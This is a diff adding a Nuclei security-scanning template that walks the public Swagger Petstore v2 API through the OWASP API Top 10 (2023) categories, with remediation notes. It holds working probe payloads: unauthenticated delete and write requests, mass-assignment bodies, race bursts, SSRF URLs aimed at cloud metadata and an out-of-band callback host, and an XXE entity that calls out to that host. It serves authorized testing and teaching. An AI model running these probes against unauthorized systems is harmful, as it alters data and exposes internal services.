@@ -1,0 +1,650 @@
+id: owasp-api-top10-swagger-petstore
+
+# =============================================================================
+# OWASP API SECURITY TOP 10 (2023) — ASSESSMENT TEMPLATE
+# Target: Swagger Petstore v2  (spec: https://petstore.swagger.io/v2/swagger.json)
+# Host under test: https://petstore.swagger.io   (basePath: /v2)
+#
+# BUILT FROM THE LIVE SPEC. Every path/param below matches what
+# /v2/swagger.json actually declares, e.g.:
+#   - GET /pet/{petId}        -> security: api_key          (should require it)
+#   - GET /store/inventory    -> security: api_key          (should require it)
+#   - POST/PUT /pet           -> security: petstore_auth, scope write:pets
+#   - POST /pet/{petId}/uploadImage -> multipart, field "additionalMetadata"
+#   - User.password           -> plain string property, no writeOnly flag
+#   - /pet/findByTags         -> "deprecated": true in the spec, but still live
+#   - No "limit"/"offset"/"page" parameter exists ANYWHERE in the spec
+#
+# USAGE
+#   nuclei -t owasp-api-top10-swagger-petstore.yaml -u https://petstore.swagger.io -v
+#   (add -interactsh-server <host> if you self-host the OOB collaborator)
+#
+# RESPONSIBLE USE — READ BEFORE RUNNING
+#   - petstore.swagger.io is SmartBear's shared PUBLIC demo. Only point the
+#     resource-consumption / business-flow (API4, API6) blocks at it with the
+#     low race_count values left in place below; raise them only against a
+#     self-hosted mirror or an environment you are explicitly authorized to
+#     load-test.
+#   - The DELETE/PUT/POST blocks mutate shared demo data. Petstore resets and
+#     is designed for exactly this kind of test; on any OTHER target, repoint
+#     these at a disposable test tenant, never production data.
+#   - This template is for authorized security assessments only.
+# =============================================================================
+
+info:
+  name: OWASP API Security Top 10 (2023) — Swagger Petstore v2 Assessment
+  author: pentest-template
+  severity: info   # aggregate/meta template — see per-check "Indicative severity" comments
+  description: |
+    Multi-request Nuclei template that walks the Swagger Petstore v2 API
+    (petstore.swagger.io/v2) through all ten OWASP API Security Top 10
+    (2023) categories. Each block is named "apiN-<check>" and commented
+    with the hypothesis being tested, the expected secure behaviour, and
+    an indicative severity if the hypothesis holds.
+  reference:
+    - https://owasp.org/API-Security/editions/2023/en/0x11-t10/
+    - https://petstore.swagger.io/v2/swagger.json
+  tags: api,owasp-api-top10,bola,broken-auth,bopla,resource-consumption,bfla,business-flow,ssrf,misconfig,inventory,unsafe-consumption,petstore
+
+http:
+
+  # ===========================================================================
+  # API1:2023 — BROKEN OBJECT LEVEL AUTHORIZATION (BOLA)
+  # Hypothesis: numeric/string object IDs can be walked and mutated with
+  # zero ownership proof — no token tying the caller to the object.
+  # Expected secure behaviour: 401/403 unless the caller owns the object.
+  # ===========================================================================
+
+  - name: api1-bola-order-id-enumeration
+    method: GET
+    path:
+      - "{{BaseURL}}/v2/store/order/1"
+      - "{{BaseURL}}/v2/store/order/4"
+      - "{{BaseURL}}/v2/store/order/10"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"petId"'
+          - '"quantity"'
+        condition: and
+    # No Authorization/api_key header sent at all. A 200 with a full Order
+    # object for every sequential ID = unauthenticated cross-object read.
+    # Indicative severity: High
+
+  - name: api1-bola-pet-id-enumeration
+    method: GET
+    path:
+      - "{{BaseURL}}/v2/pet/1"
+      - "{{BaseURL}}/v2/pet/2"
+      - "{{BaseURL}}/v2/pet/9999999"
+    matchers:
+      - type: status
+        status:
+          - 200
+    # The spec marks GET /pet/{petId} with `security: [api_key]`. This
+    # request intentionally omits the api_key header — a 200 proves the
+    # declared control is documentation-only, not enforced server-side.
+    # Indicative severity: Medium
+
+  - name: api1-bola-user-profile-cross-access
+    method: GET
+    path:
+      - "{{BaseURL}}/v2/user/user1"
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: json
+        name: exposed_user_fields
+        part: body
+        json:
+          - ".email"
+          - ".phone"
+          - ".password"
+    # Pulls a full third-party profile (see API3 below for why "password"
+    # in the extractor matters) with no session proving the caller IS
+    # user1. Indicative severity: High
+
+  - name: api1-bola-delete-without-ownership-proof
+    method: DELETE
+    path:
+      - "{{BaseURL}}/v2/store/order/5"
+    matchers:
+      - type: status
+        status:
+          - 200
+    # CAUTION: mutates shared demo data (acceptable on Petstore; on any other
+    # target substitute an order belonging to a DIFFERENT tenant than the
+    # one whose credentials you are using, to prove cross-tenant deletion).
+    # Indicative severity: Critical
+
+  # ===========================================================================
+  # API2:2023 — BROKEN AUTHENTICATION
+  # Hypothesis: endpoints that declare an auth requirement in the spec do
+  # not actually validate the credential presented (or its absence).
+  # ===========================================================================
+
+  - name: api2-declared-api-key-not-enforced
+    method: GET
+    path:
+      - "{{BaseURL}}/v2/store/inventory"
+    matchers:
+      - type: status
+        status:
+          - 200
+    # /store/inventory is declared `security: [api_key]`. No api_key header
+    # is sent. A 200 proves the control isn't enforced. Indicative severity: Medium
+
+  - name: api2-garbage-api-key-accepted
+    method: GET
+    path:
+      - "{{BaseURL}}/v2/store/inventory"
+    headers:
+      api_key: "0000-INVALID-KEY-THAT-SHOULD-NEVER-VALIDATE-{{randstr}}"
+    matchers:
+      - type: status
+        status:
+          - 200
+    # Compare this response to api2-declared-api-key-not-enforced above.
+    # If both return 200 with identical bodies, the key is decorative —
+    # any string, valid or not, is accepted. Indicative severity: Medium
+
+  - name: api2-login-rate-limit-absence
+    method: GET
+    path:
+      - "{{BaseURL}}/v2/user/login?username=pentest_probe&password=wrong-{{randstr}}"
+    race: true
+    race_count: 5   # keep LOW against the shared public demo — raise only on an
+                     # authorized load-test target to fully validate throttling
+    matchers:
+      - type: status
+        status:
+          - 200
+    # The spec itself documents an X-Rate-Limit response header on this
+    # endpoint, implying throttling is intended. If all 5 concurrent failed
+    # attempts return 200 (no 429 / lockout), authentication brute-forcing
+    # and credential stuffing are unthrottled. Indicative severity: Medium
+
+  - name: api2-logout-does-not-invalidate-prior-access
+    method: GET
+    path:
+      - "{{BaseURL}}/v2/user/logout"
+    matchers:
+      - type: status
+        status:
+          - 200
+    # Manual follow-up (not automatable against this stateless demo):
+    # replay any previously-used api_key/token AFTER this call succeeds.
+    # If subsequent authenticated calls still succeed, logout does not
+    # terminate the session/token. Indicative severity: Low–Medium
+
+  # ===========================================================================
+  # API3:2023 — BROKEN OBJECT PROPERTY LEVEL AUTHORIZATION (BOPLA)
+  # Covers both excessive data exposure and mass-assignment sub-cases.
+  # ===========================================================================
+
+  - name: api3-sensitive-property-exposure-password-field
+    method: GET
+    path:
+      - "{{BaseURL}}/v2/user/user1"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '"password"\s*:\s*"[^"]+"'
+    # The User schema defines "password" as a plain string property with no
+    # writeOnly/sensitive annotation. If GET echoes it back in cleartext,
+    # that is a textbook property-level data exposure. Indicative severity: Critical
+
+  - name: api3-mass-assignment-privileged-fields
+    method: POST
+    path:
+      - "{{BaseURL}}/v2/user"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "id": 0,
+        "username": "bopla_probe_{{randstr}}",
+        "firstName": "QA",
+        "lastName": "Probe",
+        "email": "bopla_{{randstr}}@example.com",
+        "password": "Str0ngP@ss!",
+        "phone": "0000000000",
+        "userStatus": 999,
+        "isAdmin": true,
+        "role": "admin"
+      }
+    matchers:
+      - type: status
+        status:
+          - 200
+    # Injects an out-of-range enum value (userStatus: 999) plus two fields
+    # that don't exist in the schema at all (isAdmin, role). Follow up with
+    # api1-bola-user-profile-cross-access style GET on the new username and
+    # diff the response: any accepted/reflected privileged property is a
+    # mass-assignment finding. Indicative severity: High
+
+  # ===========================================================================
+  # API4:2023 — UNRESTRICTED RESOURCE CONSUMPTION
+  # Hypothesis: no pagination, size limits, or throttling anywhere in the
+  # spec, and none enforced server-side either.
+  # ===========================================================================
+
+  - name: api4-unbounded-collection-response
+    method: GET
+    path:
+      - "{{BaseURL}}/v2/pet/findByStatus?status=available&status=pending&status=sold"
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: returned_object_count
+        part: body
+        regex:
+          - '"id"\s*:\s*\d+'
+    # The spec defines NO limit/offset/page parameter on this operation.
+    # A large, uncapped result set confirms unbounded response size.
+    # Indicative severity: Low–Medium
+
+  - name: api4-burst-request-no-throttling
+    method: GET
+    path:
+      - "{{BaseURL}}/v2/pet/findByStatus?status=available"
+    race: true
+    race_count: 5   # low & safe for the shared demo; raise only on an
+                     # authorized load-test target
+    matchers:
+      - type: status
+        status:
+          - 200
+    # All concurrent responses returning 200 with no 429/Retry-After header
+    # confirms absence of per-client rate limiting on a read-heavy endpoint.
+    # Indicative severity: Medium
+
+  - name: api4-oversized-batch-create
+    method: POST
+    path:
+      - "{{BaseURL}}/v2/user/createWithArray"
+    headers:
+      Content-Type: application/json
+    body: |
+      [
+        {"id":0,"username":"batch_{{randstr}}_1","firstName":"A","lastName":"A","email":"a@example.com","password":"x","phone":"0","userStatus":0},
+        {"id":0,"username":"batch_{{randstr}}_2","firstName":"A","lastName":"A","email":"a@example.com","password":"x","phone":"0","userStatus":0},
+        {"id":0,"username":"batch_{{randstr}}_3","firstName":"A","lastName":"A","email":"a@example.com","password":"x","phone":"0","userStatus":0},
+        {"id":0,"username":"batch_{{randstr}}_4","firstName":"A","lastName":"A","email":"a@example.com","password":"x","phone":"0","userStatus":0},
+        {"id":0,"username":"batch_{{randstr}}_5","firstName":"A","lastName":"A","email":"a@example.com","password":"x","phone":"0","userStatus":0}
+      ]
+    matchers:
+      - type: status
+        status:
+          - 200
+    # This array of 5 is a safe demonstration size. The real test is
+    # whether the server rejects a batch above some sane cap — scale this
+    # up ONLY against infrastructure you're authorized to stress, and watch
+    # for the point (if any) where it starts responding with 4xx/413/429.
+    # Indicative severity: Medium (no cap) / informational (cap exists)
+
+  # ===========================================================================
+  # API5:2023 — BROKEN FUNCTION LEVEL AUTHORIZATION (BFLA)
+  # Hypothesis: state-changing ("write") operations that the spec scopes to
+  # write:pets succeed with no credential presented at all.
+  # ===========================================================================
+
+  - name: api5-unauthenticated-write-function
+    method: POST
+    path:
+      - "{{BaseURL}}/v2/pet"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "id": 0,
+        "name": "bfla-probe-{{randstr}}",
+        "photoUrls": ["https://example.com/placeholder.jpg"],
+        "status": "available"
+      }
+    matchers:
+      - type: status
+        status:
+          - 200
+    # The spec scopes POST /pet to petstore_auth with write:pets. No
+    # Authorization header of any kind is sent here. A 200 confirms the
+    # write function is reachable with zero credential. Indicative severity: High
+
+  - name: api5-unauthenticated-destructive-function
+    method: DELETE
+    path:
+      - "{{BaseURL}}/v2/pet/9999999"
+    matchers:
+      - type: status
+        status:
+          - 404   # endpoint reached and processed the auth-less request;
+                   # 404 here means "no such pet", NOT "unauthorized" —
+                   # compare against a 401/403 baseline to confirm BFLA
+    # Also re-run against a petId you know exists (see api1 block) without
+    # any credential: a 200 there (object deleted) is the conclusive BFLA
+    # proof. Indicative severity: Critical
+
+  # ===========================================================================
+  # API6:2023 — UNRESTRICTED ACCESS TO SENSITIVE BUSINESS FLOWS
+  # Hypothesis: the "place an order" and "create account" business flows
+  # have no anti-automation control (CAPTCHA, step-up check, velocity limit).
+  # ===========================================================================
+
+  - name: api6-automated-purchase-flow-abuse
+    method: POST
+    path:
+      - "{{BaseURL}}/v2/store/order"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "id": 0,
+        "petId": 1,
+        "quantity": 1,
+        "shipDate": "2026-01-01T00:00:00.000Z",
+        "status": "placed",
+        "complete": false
+      }
+    race: true
+    race_count: 5   # demonstration burst; keep low on the shared public demo
+    matchers:
+      - type: status
+        status:
+          - 200
+    # If every concurrent order placement succeeds identically with no
+    # challenge, velocity check, or idempotency requirement, the purchase
+    # flow can be scripted at scale (inventory exhaustion / scalping /
+    # duplicate-order abuse). Indicative severity: Medium–High (business-dependent)
+
+  - name: api6-bulk-account-creation-abuse
+    method: POST
+    path:
+      - "{{BaseURL}}/v2/user/createWithList"
+    headers:
+      Content-Type: application/json
+    body: |
+      [
+        {"id":0,"username":"flow_abuse_{{randstr}}_a","firstName":"A","lastName":"A","email":"a_{{randstr}}@example.com","password":"x","phone":"0","userStatus":0},
+        {"id":0,"username":"flow_abuse_{{randstr}}_b","firstName":"A","lastName":"A","email":"b_{{randstr}}@example.com","password":"x","phone":"0","userStatus":0}
+      ]
+    matchers:
+      - type: status
+        status:
+          - 200
+    # No email verification, CAPTCHA, or per-IP velocity limit stands
+    # between this request and account creation at scale. Indicative severity: Medium
+
+  # ===========================================================================
+  # API7:2023 — SERVER-SIDE REQUEST FORGERY (SSRF)
+  # Hypothesis: a server-side consumer fetches attacker-supplied URLs
+  # (photoUrls / uploadImage metadata) rather than treating them as opaque.
+  # Uses Nuclei's interactsh OOB client for proof.
+  # ===========================================================================
+
+  - name: api7-ssrf-photourls-oob-callback
+    method: POST
+    path:
+      - "{{BaseURL}}/v2/pet"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "id": 0,
+        "name": "ssrf-probe-{{randstr}}",
+        "photoUrls": [
+          "http://{{interactsh-url}}/ssrf-photourl-test",
+          "http://169.254.169.254/latest/meta-data/",
+          "http://127.0.0.1:8080/admin"
+        ],
+        "status": "available"
+      }
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+      - type: status
+        status:
+          - 200
+    # If the interactsh matcher fires, the backend (or an async worker,
+    # thumbnailer, image-fetch service, etc.) made an outbound request to
+    # the URL supplied in photoUrls — confirmed SSRF. Even without OOB
+    # confirmation, the cloud-metadata and loopback URLs being *accepted
+    # and stored* (status matcher) without validation is itself a finding
+    # worth escalating with a longer-running collaborator session.
+    # Indicative severity: Critical (if OOB fires) / Low (accepted-but-unconfirmed)
+
+  - name: api7-ssrf-upload-metadata-field
+    method: POST
+    path:
+      - "{{BaseURL}}/v2/pet/1/uploadImage"
+    headers:
+      Content-Type: multipart/form-data; boundary=----nuclei-ssrf-boundary
+    body: |
+      ------nuclei-ssrf-boundary
+      Content-Disposition: form-data; name="additionalMetadata"
+
+      http://{{interactsh-url}}/ssrf-metadata-test
+      ------nuclei-ssrf-boundary--
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+    # Same OOB technique against the "additionalMetadata" free-text field
+    # on the image-upload endpoint. Indicative severity: Critical (if OOB fires)
+
+  # ===========================================================================
+  # API8:2023 — SECURITY MISCONFIGURATION
+  # ===========================================================================
+
+  - name: api8-cors-reflected-origin-with-credentials
+    method: GET
+    path:
+      - "{{BaseURL}}/v2/pet/1"
+    headers:
+      Origin: "https://attacker-controlled.example"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "attacker-controlled.example"
+      - type: word
+        part: header
+        words:
+          - "Access-Control-Allow-Credentials: true"
+    # Reflecting an arbitrary Origin back AND allowing credentials is the
+    # dangerous CORS combination — any site can make credentialed cross-
+    # origin calls on a victim's behalf. Indicative severity: High
+
+  - name: api8-verbose-error-stack-trace
+    method: GET
+    path:
+      - "{{BaseURL}}/v2/pet/not-a-valid-integer-id"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '(?i)(exception|stack\s*trace|at\s+[\w.]+\(\w+\.java|caused\s+by|traceback)'
+    # petId is typed integer; feeding a non-numeric value and getting back
+    # a framework stack trace (vs. a clean 400) leaks implementation
+    # details useful for further attacks. Indicative severity: Medium
+
+  - name: api8-missing-security-headers
+    method: GET
+    path:
+      - "{{BaseURL}}/v2/pet/1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Strict-Transport-Security"
+          - "X-Content-Type-Options"
+          - "Content-Security-Policy"
+        condition: and
+        negative: true
+    # Matches when NONE of these hardening headers are present on an
+    # otherwise-successful response. Indicative severity: Low
+
+  - name: api8-dangerous-http-methods-enabled
+    method: OPTIONS
+    path:
+      - "{{BaseURL}}/v2/pet/1"
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - '(?i)allow:.*\b(TRACE|CONNECT|PUT|DELETE)\b'
+    # Flags when the Allow header exposes high-risk verbs (TRACE enables
+    # Cross-Site Tracing; broad PUT/DELETE exposure widens the attack
+    # surface alongside the API5 BFLA findings above). Indicative severity: Low–Medium
+
+  - name: api8-exposed-api-documentation-surface
+    method: GET
+    path:
+      - "{{BaseURL}}/v2/swagger.json"
+      - "{{BaseURL}}/v2/swagger.yaml"
+      - "{{BaseURL}}/v2/api-docs"
+    matchers:
+      - type: status
+        status:
+          - 200
+    # The full machine-readable contract (every path, param, and schema
+    # used to build this very template) is unauthenticated. Acceptable for
+    # a deliberately public demo/sandbox; on an internal or production API,
+    # an unauthenticated spec dump is reconnaissance gold and a
+    # misconfiguration in its own right. Indicative severity: Info (demo) / Medium (prod)
+
+  # ===========================================================================
+  # API9:2023 — IMPROPER INVENTORY MANAGEMENT
+  # Hypothesis: deprecated/shadow endpoints and versions stay reachable
+  # after they fall out of the "current" documented inventory.
+  # ===========================================================================
+
+  - name: api9-deprecated-endpoint-still-live
+    method: GET
+    path:
+      - "{{BaseURL}}/v2/pet/findByTags?tags=tag1"
+    matchers:
+      - type: status
+        status:
+          - 200
+    # The spec explicitly marks findByTags "deprecated": true, yet it still
+    # answers normally. A deprecated-but-live endpoint is exactly the kind
+    # of inventory drift API9 targets — it's rarely covered by the same
+    # monitoring/hardening applied to the "current" surface.
+    # Indicative severity: Low–Medium
+
+  - name: api9-shadow-api-version-discovery
+    method: GET
+    path:
+      - "{{BaseURL}}/v1/pet/1"
+      - "{{BaseURL}}/v3/pet/1"
+      - "{{BaseURL}}/api/pet/1"
+      - "{{BaseURL}}/internal/v2/pet/1"
+      - "{{BaseURL}}/v2-beta/pet/1"
+    matchers:
+      - type: status
+        status:
+          - 200
+    # Probes for undocumented sibling API versions on the same host. Any
+    # 200 here is a version/endpoint that exists but isn't in the current
+    # published inventory — classic shadow-API exposure.
+    # Indicative severity: Medium (if any respond)
+
+  # ===========================================================================
+  # API10:2023 — UNSAFE CONSUMPTION OF APIS
+  # Hypothesis: the API blindly trusts structured input it "consumes"
+  # (XML bodies, array payloads) without validating it against its own
+  # declared schema or guarding against embedded external references.
+  # ===========================================================================
+
+  - name: api10-xxe-on-declared-xml-consumer
+    method: POST
+    path:
+      - "{{BaseURL}}/v2/pet"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE Pet [
+        <!ENTITY xxe SYSTEM "http://{{interactsh-url}}/xxe-callback">
+      ]>
+      <Pet>
+        <id>0</id>
+        <name>&xxe;</name>
+        <photoUrls><photoUrl>https://example.com/placeholder.jpg</photoUrl></photoUrls>
+        <status>available</status>
+      </Pet>
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+    # addPet/updatePet explicitly declare application/xml as a supported
+    # `consumes` type. A deliberately benign, non-destructive external
+    # entity that only triggers an outbound OOB callback (no local file
+    # read attempted) proves the XML parser resolves external entities
+    # instead of rejecting/disabling them. Indicative severity: Critical (if OOB fires)
+
+  - name: api10-schema-violating-input-blindly-accepted
+    method: POST
+    path:
+      - "{{BaseURL}}/v2/user/createWithList"
+    headers:
+      Content-Type: application/json
+    body: |
+      [
+        {"id":"not-an-int64","username":"schema_probe_{{randstr}}","firstName":"A","lastName":"A","email":"a@example.com","password":"x","phone":"0","userStatus":-999999}
+      ]
+    matchers:
+      - type: status
+        status:
+          - 200
+    # id is declared type integer/int64 and the schema implies userStatus
+    # is a small status code, not an arbitrary signed value. Silently
+    # accepting type-confused/out-of-range input (rather than a 400) shows
+    # this API — and by extension any service that in turn consumes ITS
+    # output downstream — is trusting structured data without validating
+    # it against the contract it itself publishes. Indicative severity: Low–Medium
+
+# =============================================================================
+# REMEDIATION QUICK-REFERENCE (by category)
+#   API1  Enforce object-level ownership checks server-side on every ID-bearing
+#         route; never rely on "unguessable" or sequential IDs alone.
+#   API2  Validate every declared credential server-side; add lockout/backoff
+#         on auth endpoints; invalidate tokens/sessions on logout.
+#   API3  Apply per-property, per-role allow-lists on both read (DTO filtering)
+#         and write (explicit bind lists) paths; mark secrets writeOnly.
+#   API4  Add pagination limits, payload/array size caps, and per-client rate
+#         limiting with 429 + Retry-After.
+#   API5  Re-check function-level scope server-side on every write/delete
+#         route, independent of any UI/route-level assumption.
+#   API6  Add velocity limits, step-up checks, or CAPTCHA on business-critical
+#         flows (purchase, account creation).
+#   API7  Validate/allow-list outbound URLs server-side; block link-local,
+#         loopback, and cloud-metadata ranges before any server-side fetch.
+#   API8  Harden CORS, enforce security headers, disable verbose errors and
+#         unused HTTP methods in production; gate documentation endpoints.
+#   API9  Maintain a live inventory of hosts/versions; decommission or
+#         actively monitor deprecated routes instead of leaving them live.
+#   API10 Validate all incoming structured/XML data against its schema;
+#         disable external entity resolution in XML parsers by default.
+# =============================================================================
